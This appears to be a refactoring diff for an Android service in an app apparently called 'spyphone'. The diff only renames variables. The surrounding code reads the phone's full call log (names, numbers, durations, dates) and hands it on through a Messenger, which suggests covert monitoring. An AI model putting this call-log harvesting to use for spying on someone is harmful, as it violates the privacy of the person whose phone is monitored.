@@ -24,7 +24,7 @@ import emit.esy.es.spyphone.model.CallLogItem;
 public class CallLogService extends IntentService implements ServiceResponse{
 
     private final static String LOG_TAG = "CallLogService";
-    private ArrayList<CallLogItem> clitemList;
+    private ArrayList<CallLogItem> clItemList;
 
     /**
      * Creates an IntentService.  Invoked by your subclass's constructor.
@@ -50,7 +50,7 @@ public class CallLogService extends IntentService implements ServiceResponse{
         int duration = callLogCursor.getColumnIndex(CallLog.Calls.DURATION);
         int name = callLogCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
 
-        clitemList = new ArrayList<>();
+        clItemList = new ArrayList<>();
 
         while (callLogCursor.moveToNext()) {
 
@@ -59,14 +59,14 @@ public class CallLogService extends IntentService implements ServiceResponse{
                 fullName = "Not in contact";
             String phNum = callLogCursor.getString(number);
             String callTypeCode = callLogCursor.getString(type);
-            long lngcallDate = callLogCursor.getLong(date);
+            long lngCallDate = callLogCursor.getLong(date);
             SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yy HH:mm:ss");
-            String strDate = sdf.format(new Date(lngcallDate));
+            String strDate = sdf.format(new Date(lngCallDate));
             Log.d("date", strDate);
             String callDuration = callLogCursor.getString(duration);
             String callType = null;
-            int callcode = Integer.parseInt(callTypeCode);
-            switch (callcode) {
+            int callCode = Integer.parseInt(callTypeCode);
+            switch (callCode) {
                 case CallLog.Calls.OUTGOING_TYPE:
                     callType = "Outgoing";
                     break;
@@ -78,10 +78,10 @@ public class CallLogService extends IntentService implements ServiceResponse{
                     break;
             }
 
-            CallLogItem clitem = new CallLogItem(fullName, phNum, callType, callDuration, strDate);
-            clitemList.add(clitem);
+            CallLogItem clItem = new CallLogItem(fullName, phNum, callType, callDuration, strDate);
+            clItemList.add(clItem);
         }
-        Collections.reverse(clitemList);
+        Collections.reverse(clItemList);
         callLogCursor.close();
         onWorkDone(intent);
     }
@@ -93,7 +93,7 @@ public class CallLogService extends IntentService implements ServiceResponse{
         Bundle bundle = intent.getExtras();
         Bundle data = new Bundle();
         data.putString("action", "callLog");
-        data.putSerializable("content", clitemList);
+        data.putSerializable("content", clItemList);
         if (bundle != null) {
             Messenger messenger = (Messenger) bundle.get("messenger");
             Message msg = Message.obtain();
